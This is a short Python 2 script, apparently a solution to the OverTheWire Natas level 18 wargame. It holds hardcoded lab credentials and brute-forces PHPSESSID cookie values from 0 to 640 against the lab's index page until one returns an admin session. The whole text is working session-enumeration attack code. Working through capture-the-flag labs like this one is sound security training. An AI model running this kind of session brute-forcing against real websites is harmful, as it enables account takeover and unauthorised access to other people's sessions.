import base64
from datetime import datetime
import requests
import pprint

TARGET_URL = 'http://natas18.natas.labs.overthewire.org/index.php?debug=1'

AUTH = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

for i in xrange(641):
    r = requests.post(TARGET_URL, data={}, auth=AUTH, cookies={'PHPSESSID':str(i)})
    if 'You are an admin' in r.text:
        print r.text
    elif 'Please login' in r.text:
        print i, 'not a session'
    else:
        print i, 'is a session'
